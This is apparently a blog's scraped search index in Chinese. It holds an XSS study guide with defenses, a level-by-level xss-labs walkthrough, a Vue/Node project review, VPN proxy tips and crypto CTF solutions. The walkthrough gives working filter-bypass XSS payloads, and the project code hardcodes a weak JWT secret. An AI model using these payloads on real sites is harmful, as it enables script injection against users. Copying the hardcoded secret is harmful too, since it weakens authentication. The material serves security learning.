HTML主要是为了避免歧义所以才解码的，比如\u003c\u003e这种东西可能是标签or属性值，那么传递的时候利用编码就不会有歧义了，例如\u003cdiv\u003e–\u003e\u0026#x003c;\u0026#x0064;\u0026#x0069;\u0026#x0076;\u0026#x003e;or\u0026#60;\u0026#100;\u0026#105;\u0026#118;\u0026#62;。 JavaScript主要是为了防止漏洞和语法错误，一般遇到\u003cscript\u003e这种东西就回进行JS编码，但是\u003c \u003e ' \" ( )是不能JS编码的 举个栗子：\u003cimg src=# onerror=alert(1)\u003e，解码之后是\u003cimg src=# onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)\u003e，而不是全部去解码 ","date":"2025-05-09","objectID":"/study_xss/:3:4","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"实战 ","date":"2025-05-09","objectID":"/study_xss/:4:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"常见的基础的payload \u003cscript\u003ealert(1)\u003c/script\u003e \u003cimg scr=1 onerror=alert(1)\u003e \u003csvg onload=alert(1)/\u003e \u003ca href=javascript:alert(1)\u003exss\u003c/a\u003e and so on ","date":"2025-05-09","objectID":"/study_xss/:4:1","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"一般场景 有框就插进去试试，记得F12锁定框去看看过滤了什么。 ","date":"2025-05-09","objectID":"/study_xss/:4:2","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"文件上传XSS 修改文件后缀：bp抓了，上传文件的时候把后缀改成.htmlor.htm，然后在文件里面去插入XSS代码 svg写入XSS：简单来说就是svg文件里面去嵌入XSS代码，例如 \u003csvg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\"\u003e \u003ccircle cx=\"100\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"2\" fill=\"red\" /\u003e \u003cscript\u003ealert(1)\u003c/script\u003e \u003c/svg\u003e exif写入XSS：前提需要网站解析图片的exif信息才可以成功使用此方法，exiftool -Comment=\"\u003cscript\u003ealert(1)\u003c/script\u003e filename.png\" ","date":"2025-05-09","objectID":"/study_xss/:4:3","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"PDF-XSS PDF编辑里面可以插入XSS代码，写进去然后保存成PDF文件，传到浏览器。但是这不是我们最终的目的，在本地弹窗的意义不大，我们需要让某个网站在线解析或者打开我们制作好的PDF文件才可以，当然防御的方法就是用户在打开PDF文件时候，强制让用户在本地下载打开。 更多方法看https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html ","date":"2025-05-09","objectID":"/study_xss/:4:4","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"工具 fuzz：https://github.com/TheKingOfDuck/easyXssPayload XSStrike：python xsstrike.py -u http~ ","date":"2025-05-09","objectID":"/study_xss/:4:5","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"关于防御 ","date":"2025-05-09","objectID":"/study_xss/:5:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"逻辑方面 一般的XSS：过滤/把HTML实体化编码特殊字符:\u003c\u003e\"'等 文件上传XSS：检查后缀，剥离exif标签 PDF-XSS：强制用户必须下载文件，而不能在线阅读 ","date":"2025-05-09","objectID":"/study_xss/:5:1","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"代码方面 PHP的htmlentities()orhtmlspecialchars() python的cgi.escape() ASP的Server.HTMLEncode() Java的xssprotect nodejs的node-validator ","date":"2025-05-09","objectID":"/study_xss/:5:2","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"HTTP头层次 X-XSS-Protection 通过设置其值为1，启用浏览器的XSS防护，浏览器会做出下面的措施： 自动关闭或过滤掉潜在的XSS攻击脚本：浏览器会检测响应内容是否包含恶意脚本，并自动关闭或过滤掉这些脚本，防止它们被执行。 重定向到安全页面：如果浏览器检测到具有潜在XSS威胁的内容，它可能会将用户重定向到一个更安全的页面，以防止攻击脚本的执行。 X-Download-Options 通过设置其值为noopen，使得浏览器下载文件时不自动打开，不关联下载文件和浏览器内嵌程序。这样可以防止一些特定类型的文件（例如html、pdf等）被当作网页打开，降低XSS攻击的风险。 X-Content-Type-Options 通过设置X-Content-Type-Options头的值为\"nosniff\"，可以防止浏览器将响应内容以错误的方式解析，减少了XSS攻击的风险。 X-Frame-Options 通过设置X-Frame-Options头，可以阻止通过嵌入iframe或frame的方式进行点击劫持攻击。可以设置该头的值为\"DENY\"，\"SAMEORIGIN\"或\"ALLOW-FROM \u003c域名\u003e\"。 Content Security Policy（CSP） 通过设置CSP头，可以限制资源加载的来源，以防止执行不受信任的脚本。CSP可以指定允许的域名、允许的脚本类型以及其他安全策略。 ","date":"2025-05-09","objectID":"/study_xss/:5:3","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"HttpOnly 当一个 cookie 设置了 HttpOnly 标志后，浏览器会禁止通过 JavaScript 脚本来读取这个 cookie 的值。这意味着即使有 XSS 攻击成功注入了恶意脚本，也无法从受害者浏览器中获取敏感的 cookie 值，从而有效防止了 cookie 盗取和会话劫持攻击。 但是HttpOnly不能够完全防御XSS，只能减少XSS带来的危害。 PHP setcookie('cookie_name', 'cookie_value', time()+3600, '/', '', false, true); // 最后一个参数设置为 true 表示设置 HttpOnly 标志，false 表示不设置 Java import javax.servlet.http.Cookie; Cookie cookie = new Cookie(\"cookie_name\", \"cookie_value\"); cookie.setMaxAge(3600); cookie.setPath(\"/\"); cookie.setHttpOnly(true); // 设置 HttpOnly 标志 response.addCookie(cookie); Python（Django 框架） response.set_cookie('cookie_name', 'cookie_value', max_age=3600, httponly=True) # 设置 httponly=True 表示设置 HttpOnly 标志 nodejs cnpm i xss -S const {xss} = require('xss') const newBlog = (blogData = {}) =\u003e { const title = xss(blogData.title) } ","date":"2025-05-09","objectID":"/study_xss/:5:4","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"XSS-lab 一个基础xss靶场，后面4个是关于flash的，就不写了 ","date":"2025-05-09","objectID":"/study_xss/:6:0","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"关于靶场搭建 windows可以小皮搭建，mac/linux推荐docker docker run -d –name xss-labs -p 51142:80 shadowaura/xss-labs:latest ","date":"2025-05-09","objectID":"/study_xss/:6:1","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"level1~2 无任何防御的两关 level1 直接输入\u003cscript\u003ealert(1);\u003c/script\u003e即可 level2 先把老payload输入进去，发现不行，并且payload回显在 \u003cform action=\"level2.php\" method=\"GET\"\u003e \u003cinput name=\"keyword\" value=\"\u003cscript\u003ealert(1)\u003c/scrpit\u003e\"\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"搜索\"\u003e \u003c/form\u003e 甚至发现这个并没有被转义，主要是因为没有闭合导致的，加入\"\u003e 即可 完整payload：\"\u003e \u003cscript\u003ealert(1)\u003c/script\u003e ","date":"2025-05-09","objectID":"/study_xss/:6:2","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"level3~9(字符过滤绕过) level3 注：php8.1.0及其以上版本已经修复 htmlspecialchars函数，把预定义的字符转换为 HTML 实体 \u0026：转换为\u0026 “：转换为\" ‘：转换为成为 ' \u003c：转换为\u003c ‘\u003e：转换为\u003e 语法htmlspecialchars(string,flags,character-set,double_encode) string：必需，规定要转换的字符串 flags ：可选，规定如何处理引号、无效的编码以及使用哪种文档类型 character-set ：可选，一个规定了要使用的字符集的字符串，如：UTF-8（默认） double_encode ：可选，布尔值，规定了是否编码已存在的 HTML 实体。 flags参数可用的引号类型 ENT_COMPAT ：默认仅编码双引号。 ENT_QUOTES：编码双引号和单引号。 ENT_NOQUOTES：不编码任何引号。 注：xss-lab中有些关卡可以利用单引号绕过是因为flags参数默认只编码双引号 double_encode参数布尔值 TRUE：默认，将对每个实体进行转换。 FALSE：不会对已存在的 HTML 实体进行编码。 这里靶场用的是htmlspecialchars($str)，尝试输入pyload，发现 \u003ch2 align=center\u003e没有找到和\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;相关的结果.\u003c/h2\u003e\u003ccenter\u003e，然而，可以发现这里 value 的值用的是单引号。既然单引号不会被转义，我们可以闭合 value 这个字符串。 但是，\u003c\u003e 都会被转义，似乎不能闭合这个标签。有什么办法能够不用 \u003cscript\u003e 标签来注入 JavaScript 代码呢？答案是使用触发器，比如 onfocus 或者 onmouseover。 javascript:alert(1) 使用了java伪协议，就是把javascript: 后面的代码当JavaScript来执行 onmouseover=javascript:alert(1) onfocus=javascript:alert(1) level4 payload打进去，回显\u003ch2 align=center\u003e没有找到和\u0026lt;script\u0026gt;alert(1)\u0026lt;/scrpit\u0026gt;相关的结果.\u003c/h2\u003e\u003ccenter\u003e 把\u003c给过滤了，双引号没过滤，把上一个代码改一下扔进去试试，合理 \" onmouseover=javascript:alert(1) \" level5 老规矩，输入payload，返回\u003ch2 align=center\u003e没有找到和\u0026lt;script\u0026gt;alert(1)\u0026lt;/scrpit\u0026gt;相关的结果.\u003c/h2\u003e\u003ccenter\u003e， 而且输入框中变成了\u003cscr_ipt\u003ealert(1)\u003c/scrpit\u003e， 输入\"\u003e\" onmouseover=javascript:alert(1) \"，发现变成\" o_nmouseover=javascript:alert(1) \"\"\u003e 正确思路是可以利用 JavaScript 的 URI \u003ca href=javascript:alert(1)\u003ehack\u003c/a\u003e \u003ca\u003e标签后面的href不一定非要跟url，还可以是URI，可以视为 URL 的超集，后面跟javascript就可以执行后面的内容，mailto就会去打开邮件去发信息，所以可以借助这个运行js代码 \"\u003e \u003ca href=javascript:alert(1)\u003ehack\u003c/a\u003e level6 尝试payload，发现变成\u003cscr_ipt\u003ealert(1)\u003c/scrpit\u003e，尝试5的payload，发现变成\u003ca hr_ef=javascript:alert(1)\u003ehack\u003c/a\u003e\"\u003e，发现href被过滤了，课源码， $str2=str_replace(\"\u003cscript\",\"\u003cscr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); 发现过滤了五个东西，可以利用html的特性，HREF和href的效果是一样的，大小写不会区分 \"\u003e \u003ca HREF=javascript:alert(1)\u003ehack\u003c/a\u003e level7 尝试输入payload，发现回显\u003c\u003ealert(1)\u003c/scrpit\u003e，整个被替换为空了，那么6的payload当然不能使用了，看题目源码 $str2=str_replace(\"script\",\"\",$str); $str3=str_replace(\"on\",\"\",$str2); $str4=str_replace(\"src\",\"\",$str3); $str5=str_replace(\"data\",\"\",$str4); $str6=str_replace(\"href\",\"\",$str5); 果然全部换为空，但是php特性，替换只会替换一个，比如\u003cscriscriptpt\u003e就会被替换为\u003cscript\u003e，这就是双写绕过？ \"\u003e \u003cscriscriptpt\u003ealert(1)\u003c/scriscriptpt\u003e level8 尝试原始payload，发现会被替换\u003cscr_ipt\u003ealert(1)\u003c/scr_ipt\u003e，并且是链接形式，好像没啥区别，看源码 $str2=str_replace(\"script\",\"scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); $str7=str_replace('\"','\u0026quot',$str6); 新增的是双引号被过滤了， \"\u003e \u003ca href=javascript:alert(1)\u003ehack\u003c/a\u003e进去变成\u003ca hr_ef=javascr_ipt:alert(1)\u003ehack\u003c/a\u003e，href可以通过大写绕过，但是javascript怎么搞 HTML 实体有两种写法，第一种是 \u0026entity_name; 形式，比如 $lt; 表示小于号，”\u0026“开头，”;“结尾；第二种是 \u0026#entity_number; 形式，其中 entity_number 是字符的实体编号，比如 \u0026#60; 也能表示小于号。使用第二种方式，任何字符（包括 ASCII 字符）都有其实体表示。https://mothereff.in/html-entities 可以提供转换，”\u0026#“开头，”;“结尾 突然想起来这个是要加入到链接的，HREF不用写的 javascr\u0026#x69;pt:alert(1) level9 尝试上一题的payload，回显\u003ca href=\"您的链接不合法？有没有！\"\u003e，看看源码 $str2=str_replace(\"script\",\"scr_ipt\",$str); $str3=str_replace(\"on\",\"o_n\",$str2); $str4=str_replace(\"src\",\"sr_c\",$str3); $str5=str_replace(\"data\",\"da_ta\",$str4); $str6=str_replace(\"href\",\"hr_ef\",$str5); $str7=str_replace('\"','\u0026quot',$str6); false===strpos($str7,'http://') 与上一题不同的就是添加了对http的验证,我们在后面加上注释，写上http://就行了 javascr\u0026#x69;pt:alert(1)//http:// ","date":"2025-05-09","objectID":"/study_xss/:6:3","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["CTF"],"content":"level10~16(字段注入) level10 尝试老payload，发现无特别回显，看看源码 ini_set(\"display_errors\", 0); $str = $_GET[\"keyword\"]; $str11 = $_GET[\"t_sort\"]; $str22=str_replace(\"\u003e\",\"\",$str11); $str33=str_replace(\"\u003c\",\"\",$str22); \u003cform id=search\u003e \u003cinput name=\"t_link\" value=\"'.'\" type=\"hidden\"\u003e \u003cinput name=\"t_history\" value=\"'.'\" type=\"hidden\"\u003e \u003cinput name=\"t_sort\" value=\"'.$str33.'\" type=\"hidden\"\u003e \u003c/form\u003e 尝试所有内容输入http://localhost:51142/level10.php?keyword=test?t_link=tlink\u0026t_history=thistory\u0026t_sort=tsort ，得到 \u003cinput name=\"t_link\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_history\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_sort\" value=\"tsort\" type=\"hidden\"\u003e t_sort的信息并没有过滤，可以尝试从这里注入，从源码得知\u003c\u003e被过滤掉，尝试类似\" onmouseover=javascript:alert(1) \"的payload http://localhost:51142/level10.php?keyword=test\u0026t_sort=\" onmouseover=javascript:alert(1) \" 发现回显 \u003cinput name=\"t_sort\" value=\"\" onmouseover=javascript:alert(1) \"\" type=\"hidden\"\u003e ,被隐藏了xd，html里面加一个type去覆盖这个状态 http://localhost:51142/level10.php?keyword=test\u0026t_sort=\" onmouseover=javascript:alert(1) type \" level11 看页面源码 \u003cinput name=\"t_link\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_history\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_sort\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_ref\" value=\"http://localhost:51142/level10.php?keyword=test\u0026t_sort=%22%20onmouseover=javascript:alert(1)%20type%20%22\" type=\"hidden\"\u003e 发现referer被传回来，是上一个靶场的链接，bp抓包给他改了传回去 Referer: \"type=\"text \"onmousemove=\"alert(1) 还有一种方法创建一个文件名为 \" onmouseover=javascript:alert(1) type \".html 的 HTML 文件，在其中重定向到 level 11 的页面。 level12 看看页面源码 \u003cinput name=\"t_link\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_history\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_sort\" value=\"\" type=\"hidden\"\u003e \u003cinput name=\"t_ua\" value=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15\" type=\"hidden\"\u003e 给了ua，很明显举要改ua，改成\"type=\"text \"onmousemove=\"alert(1)就行 level13 修改cookie为\" onmouseover=javascript:alert(1) type \" level14 貌似这个关卡寄了，看别人的博客貌似是exif xss，就是图片上传，图片的属性改成xss的马 level15 这一关考的是ng-include:这个东西，文件包含 ng-include 指令用于包含外部的 HTML 文件。 包含的内容将作为指定元素的子节点。 ng-include 属性的值可以是一个表达式，返回一个文件名。 默认情况下，包含的文件需要包含在同一个域名下。 语法 \u003celement ng-include=\"filename\" onload=\"expression\" autoscroll=\"expression\" \u003e\u003c/element\u003e 第一种做法，把以前关卡的漏洞包含进去，我们就可以打了 第二种方法，写一个能够弹窗的简单 HTML，然后 include 进来 \u003chtml\u003e \u003ch1\u003ehacker\u003c/h1\u003e \u003cimg src=1 onerror=\"alert(1)\"\u003e\u003c/img\u003e \u003c/html\u003e 如果放在网站根目录，就是?src=\"/alert.html\" 感觉这种遇到的可能性很小 level16 看下面源码 $str2=str_replace(\"script\",\"\u0026nbsp;\",$str); $str3=str_replace(\" \",\"\u0026nbsp;\",$str2); $str4=str_replace(\"/\",\"\u0026nbsp;\",$str3); $str5=str_replace(\" \",\"\u0026nbsp;\",$str4); 还是过滤类型的，空格和srcipt都没了，主要是空格，html里面换行符可以替换掉空格，%0A http://localhost:51142/level16.php?keyword=\u003cimg%0Asrc=1%0Aonerror=\"alert(1)\"\u003e ","date":"2025-05-09","objectID":"/study_xss/:6:4","tags":["study"],"title":"Study_xss","uri":"/study_xss/"},{"categories":["nodejs"],"content":"前言 五一闲来无事，也不是特别想打ctf，啧，最近感觉打ctf的体验越来越不对了，热爱好像变质了？搓个项目玩吧。在这里复盘一下 ","date":"2025-05-04","objectID":"/about51/:1:0","tags":["开发"],"title":"五一长假vue3+nodejs全栈项目复盘","uri":"/about51/"},{"categories":["nodejs"],"content":"整体框架 前端vue3，好久没搓vue了，还挺怀念去年暑假学vue的。 后端nodejs+expres，本来想用fastify，但是掌握度不高，还是稳一点吧，别给自己写恶心了。 项目挺老套的，新闻+产品管理/发布项目，两套前端(admin\u0026web)，一个后端(server)。管理又分为管理员和编辑员。 ","date":"2025-05-04","objectID":"/about51/:2:0","tags":["开发"],"title":"五一长假vue3+nodejs全栈项目复盘","uri":"/about51/"},{"categories":["nodejs"],"content":"前端 初期配置 vue create admin创建后台管理项目，在8080端口运行 vue create web创建企业门户页面，在8081端口运行 因为用的一套后端在3000端口，上来直接配置vue.config.js，利用反向代理和后端通讯 const { defineConfig } = require('@vue/cli-service') module.exports = defineConfig({ transpileDependencies: true, devServer: { proxy: { \"api阿巴阿巴\": { target: \"http://localhost:3000\", changeOrigin: true } } } }) 不过让我最好奇的他这个居然不是es6写法 模板组件 为了前端不那么丑，我大量使用了element-plus的组件，使用方法照抄官网的就行，值得注意的是参数调整和自己灵活应用组件 关于时间处理 时间规范化处理可以使用moment，可以参考他们的官方文档，一般常用的方法是 import moment from 'moment' moment.locale(\"zh-cn\"); const formatTime = { getTime: (data) =\u003e { return moment(data).format('YYYY/MM/DD') } } export default formatTime 关于文件上传 因为传新闻和产品的时候总会用到的，虽然写好一个复制粘贴过去就行，但是又长又臭非常的影响我心情，这种时候可以利用封装的思想，把这个单独封装成一个组件去使用 关于路由配置 路由配置又麻烦又简单的，创建的时候就有一个router/index.js，因为admin项目的左侧栏会放很多的子选项，就会加一堆路由，用子路由实现是合理的，但是就会有一些问题，比如权限性问题，我又不想在后端实现，所以我专门写了个router/config.js去实现动态路由，并在里面实现权限管理requireAdmin，感觉比较简陋，就是对编辑员隐藏这个路由 关于拦截器 这里直接使用axios，直接把官网的拉过来用了，写了个util/axios.config.js，去实现拦截器 关于富文本编辑器 现在用的还是wangeditor的v4，为什么呢？因为很简单，可以直接导入，不像v5需要自己再重新配置，但是还是过时了，后面再换成v5或者是其他的markdown编辑器吧，咕咕咕 关于样式 经典常用\u003cstyle lang=\"scss\" scoped\u003e ，但是如果Element Plus 的子组件，它的 DOM 结构并不在当前组件的模板中，我就不能加效果了，那么就可以用::v-deep去穿透，比如 .avatar-uploader .el-upload { ... } 编译后 .avatar-uploader .el-upload[data-v-xxxxxx] { ... } ::v-deep .avatar-uploader .el-upload { ... } 编译后 [data-v-xxxxxx] .avatar-uploader .el-upload { ... } 这样就可以作用进去了 ","date":"2025-05-04","objectID":"/about51/:2:1","tags":["开发"],"title":"五一长假vue3+nodejs全栈项目复盘","uri":"/about51/"},{"categories":["nodejs"],"content":"后端 初期配置 express默认创建时commonjs模式，不喜欢，先全部重构成es6，再规划一下 经典的nodejs+MVC.routes路由是纯接口==\u003econtrollers数据处理=\u003emodels层数据操作==\u003e数据库==\u003e返回数据 数据库 这里用的mongo，nodejs里面用mongoose去创建模型，可视化用的是vsc的插件Database Client 关于token 这里使用jsonwebtoken去实现，方便好用放心，同时结合前端的身份区分去进行完善，因为是自己写的小项目，key也就随便输入了一个常用的，例如 import jsonwebtoken from 'jsonwebtoken' const secret = 'abab' export class JWT { generate(value, expries) { return jsonwebtoken.sign(value, secret, { expiresIn: expries }) } verify(token) { try { return jsonwebtoken.verify(token, secret) } catch (error) { return false } } } //验证token app.use((req, res, next) =\u003e { //如果token有效，next(),如果无效，返回401给前端 if (req.url === '/adminapi/user/login') { next() return; } const token = req.headers[\"authorization\"].split(\" \")[1] if (token) { const payload = jwt.verify(token) if (payload) { const newToken = jwt.generate({ _id: payload._id, username: payload.username }, '1d') res.header(\"Authorization\", newToken) next() } else { res.status(401).send({ errCode: \"-1\", errorInfo: \"token过期\" }) } } }) 关于MVC\u0026数据库 nodejs的MVC是要自己手动实现的，就像上面所写的一样，需要创建三个文件夹，分别去实现不同的功能，这点就没springboot好。 同时创建之后，再在下面创建admin和web文件夹，分别去处理管理页面和门户页面，以免写的api太乱。 关于数据库本地docker去搭mango并且关联到db这个文件夹，同时一套模型对应两套前端，方便调用，也没有同步的问题，比如 import mongoose from 'mongoose' const { Schema } = mongoose const NewsSchema = new Schema({ title: String, content: String, category: Number, // 123 cover: String, // 封面 isPublish: Number, // 发布状态 editTime: Date, // 编辑时间 }) // 注册并导出模型 const NewsModel = mongoose.model(\"news\", NewsSchema) export default NewsModel config文件里面去写关于数据库的东西 import mongoose from \"mongoose\"; mongoose.connect(\"mongodb://127.0.0.1:27017/company-system\", { useNewUrlParser: true, useUnifiedTopology: true, }); const db = mongoose.connection; db.on(\"error\", (err) =\u003e { console.error(\"❌ MongoDB connection error:\", err); }); db.once(\"open\", () =\u003e { console.log(\"✅ MongoDB connected successfully!\"); }); export default db; 那么该如何使用呢，server文件夹下的直接对数据库模型进行调用，在XXserver.js里面写入api，比如 import NewsModel from '../../models/NewsModel.js' const NewsService = { add: async ({ title, content, category, isPublish, cover, editTime }) =\u003e { return NewsModel.create({ title, content, category, isPublish, cover, editTime }) }, getList: async ({ _id }) =\u003e { return _id ? NewsModel.find({ _id }) : NewsModel.find({}) }, publish: async ({ _id, isPublish, editTime }) =\u003e { return NewsModel.updateOne({ _id }, { isPublish, editTime }) }, delList: async ({ _id }) =\u003e { return NewsModel.deleteOne( { _id } ) }, updateList: async ({ _id, title, content, category, isPublish, cover, editTime }) =\u003e { if (cover) { return NewsModel.updateOne({ _id }, { title, content, category, isPublish, cover, editTime }) } else { return NewsModel.updateOne({ _id }, { title, content, category, isPublish, editTime }) } } } export default NewsService 然后Controller文件再去调用server文件，最后合并到路由里面，这样就算是封装好了 ","date":"2025-05-04","objectID":"/about51/:2:2","tags":["开发"],"title":"五一长假vue3+nodejs全栈项目复盘","uri":"/about51/"},{"categories":["nodejs"],"content":"个人感受 这个项目很简单，主要就是练手的，前后端交互和调试占了好多时间，还是写的太少了，和其他的对比的话，和spring不同，nodejs让我感觉更加组件化，个人写的更加舒服和享受。但是现在写进去的东西太少了，比如前面study系列的单点登录，orm等知识点都没用，并且小项目也凸显不出nodejs最大的优势，后面可能会改善这个，把这个复杂化，技术化，或者是直接去写一个更大的(或者是咕咕咕) ","date":"2025-05-04","objectID":"/about51/:3:0","tags":["开发"],"title":"五一长假vue3+nodejs全栈项目复盘","uri":"/about51/"},{"categories":["靶场"],"content":"主要问题 ","date":"2025-04-28","objectID":"/about_htb-thm/:1:0","tags":["渗透"],"title":"关于HTB-THM连不上","uri":"/about_htb-thm/"},{"categories":["靶场"],"content":"梯子配置 这里是mac系统，linux应该是类似的，win自己挂到linux虚拟机或者是梯子开局域网模式即可 clashorv2rayN都会有一个端口开放，我是直接暴露出去的，记得开系统代理即可 ","date":"2025-04-28","objectID":"/about_htb-thm/:1:1","tags":["渗透"],"title":"关于HTB-THM连不上","uri":"/about_htb-thm/"},{"categories":["靶场"],"content":".ovpn文件 tcp一般都能连上，但是只有htb的有，而且htb的联机模式还不是tcp udp的问题一般在于连不上或者是机场不支持，机场不支持换一个就好了 连不上的话在.ovpn文件加入一句socks-proxy 127.0.0.1 port，端口就是梯子的端口 ","date":"2025-04-28","objectID":"/about_htb-thm/:1:2","tags":["渗透"],"title":"关于HTB-THM连不上","uri":"/about_htb-thm/"},{"categories":["靶场"],"content":"其他问题 全搞好了还不行？ mac推荐用orbstack，win推荐用wsl2，都直接走本机的环境，不用额外配置，缺点是没有ui 非要虚拟机的话，里面下个梯子重复上面的操作，一般都不会有问题 实在解决不了直接重装一个虚拟机得了xd，说不定是你以前把环境玩坏了 ","date":"2025-04-28","objectID":"/about_htb-thm/:2:0","tags":["渗透"],"title":"关于HTB-THM连不上","uri":"/about_htb-thm/"},{"categories":["CTF"],"content":"前言 最近期中考试没怎么刷题来着，复现复现没参加的比赛吧～ ","date":"2025-04-23","objectID":"/ny2025/:1:0","tags":["crypto"],"title":"能源大赛2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"题目 ","date":"2025-04-23","objectID":"/ny2025/:2:0","tags":["crypto"],"title":"能源大赛2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"simpleSignin task.py from Crypto.Util.number import * from gmpy2 import * import os flag = b'xxx' p = next_prime(bytes_to_long(os.urandom(128))) q = next_prime(bytes_to_long(os.urandom(128))) r = next_prime(q) n = p * q * r e = 0x10001 print(f\"n = {n}\") print(f\"c = {pow(bytes_to_long(flag), e, n)}\") print(f\"gift1 = {p % (2**10)}\") print(f\"gift2 = {(p \u003e\u003e 20) % 2 ** 800}\") 拿到题就知道这玩意是copper，好像比赛当天还有人在群里问来着，有点意思(，简单分析一下 gift1-\u003e低10位 gift2-\u003e右移20位后的低800位 我们可以认为已知了低820位，那10位可以爆破，那么前面直接copper求出 exp.py n = c = gift1 = 513 gift2 = e=65537 from Crypto.Util.number import * PR.\u003cx\u003e = PolynomialRing(Zmod(n)) for i in range(2**10): p_low = (gift2\u003c\u003c20)+(i\u003c\u003c10)+gift1 f = x*2**820+p_low root = f.monic().small_roots(X=2^204,beta=0.33) if root: p = int(root[0]*2**820+p_low) if n%p==0: phi = p-1 d = inverse(e,phi) m = pow(c,d,p) flag=long_to_bytes(m) print(flag) break ","date":"2025-04-23","objectID":"/ny2025/:2:1","tags":["crypto"],"title":"能源大赛2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"NumberTheory task.py from Crypto.Util.number import * import hint flag=b'xxx' e=65537 p=getPrime(512) q=getPrime(512) n=p*q m=bytes_to_long(flag) c=pow(m,e,n) k=getPrime(1024) assert hint + 233 * k == 233 * k * p print(n) print(c) print(hint) 经典数论题 $$ hint=233k(p-1) \\\\ a^{hint}=a^{233k(p-1)} \\mod p =1 \\mod p \\\\ p=\\gcd(a^{hint}-1,p) $$exp.py from Crypto.Util.number import * n= c= hint= e = 65537 p = GCD(pow(2,hint,n)-1,n) q = n//p phi = (p-1)*(q-1) d = inverse(e,phi) m = pow(c,d,n) flag = long_to_bytes(m) print(flag) ","date":"2025-04-23","objectID":"/ny2025/:2:2","tags":["crypto"],"title":"能源大赛2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"easy_lwe task.py from Crypto.Util.number import * from secrets import flag assert len(flag) == 38 p = getPrime(512) m = getPrime(512) while m \u003e p: m = getPrime(512) aa = [] cc = [] bb = [] for i in range(30): a = getPrime(512) b = getPrime(400) c = (a * m + b) % p aa.append(a) cc.append(c) bb.append(b) enc = pow(m,flag,p) print(f'p = {p}') print(f'aa = {aa}') print(f'cc = {cc}') print(f'enc = {enc}') part1是hnp问题，所以题目为什么叫lwe？直接用la佬的脚本就行了，微微改一下 part2是dlp问题，p-1是可分解的，经典Pohlig-Hellman，这里借鉴山石的思路，最后一个素数不用，而去爆破求解，效率更加快 exp.py from Crypto.Util.number import * p = aa = enc = K = 2 ** 400 P = identity_matrix(30) * p RC = matrix([[-1, 0], [0, 1]]) * matrix([aa, cc]) KP = matrix([[K / p, 0], [0, K]]) M = block_matrix([[P, 0], [RC, KP]], subdivide=False) shortest_vector = M.LLL() x = shortest_vector[1, -2] / K * p % p print(x) factors=[]#sage就能出来 dlogs = [] for fac in factors[:-1]: t = (p - 1) // fac dlog = discrete_log(G(pow(enc, t, p)), G(pow(x, t, p))) dlogs += [dlog] s = (p - 1) // factors[-1] print(s) res = crt(dlogs, factors[:-1]) for i in range(100): if b'flag{'in long_to_bytes(res + i * s): print(long_to_bytes(res + i * s)) break ","date":"2025-04-23","objectID":"/ny2025/:2:3","tags":["crypto"],"title":"能源大赛2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"easy_crypto task.py from secret import flag from Crypto.Util.number import getPrime flag = bin(int.from_bytes(flag, 'big'))[2:] private_key = [] g = getPrime(10) private_key.append(g) for i in range(len(flag) - 1): g = g * 2 private_key.append(g) a = getPrime(20) b = getPrime(len(flag) + 20) public_key = [] for i in private_key: public_key.append((a * i) % b) print(public_key) c = 0 for i in range(len(flag)): c += int(str(flag)[i])*public_key[i] print(c) 前面先套了个lcg，直接求出seed，后面就是背包 exp.py from Crypto.Util.number import * #我是取的最后两组 y = x = public_key = c = b = 2*x - y a = factor(public_key[0])[1][0] private_key = [] for i in public_key: private_key.append(int(i*pow(a,-1,b)%b)) c = c*pow(a,-1,b)%b flag = '' for i in private_key[::-1]: if c \u003e= i: c -= i flag = '1' + flag else: flag = '0' + flag print(long_to_bytes(int(flag,2))) 